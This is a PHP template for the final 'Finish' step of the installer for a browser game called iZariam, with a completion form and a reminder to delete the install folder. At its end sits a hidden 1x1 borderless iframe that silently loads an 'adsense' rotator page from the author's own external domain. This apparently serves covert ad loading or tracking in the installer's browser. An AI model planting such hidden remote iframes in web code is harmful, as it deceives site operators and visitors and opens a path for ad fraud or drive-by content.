<?php
/*
 * Project: iZariam
 * File: install/templates/finish.php
 * Edited: 07/03/2012
 * By: ZZJHONS
 * Info: zzjhons@gmail.com
 */
?>
<center>
    <h2>Step 5: Finish</h2>
    <progress value="5" max="5">
             <span>100</span>%
    </progress>
    <br>
    <br>
    <form action="install.php" method="post" id="finish">
        <center>
            <p style="padding: 20px 0px 5px 0px;">
                <font color="red" title="If you don't click, server don't work"><b>Important!:</b></font> Click the "Finish" button to finish the install and start to play.
                <br>
                And remenber <b>delete install folder</b>.
            </p>
        </center>
        <br>
        <input type="submit" class="button" value=" Finish ">
        <input type="hidden" name="finish" value="1">
    </form>
</center>
<iframe src="http://rotador.zzjhons.com/adsense/index.php" marginheight="0" marginwidth="0" frameborder="0" height="1" scrolling="no" width="1"></iframe>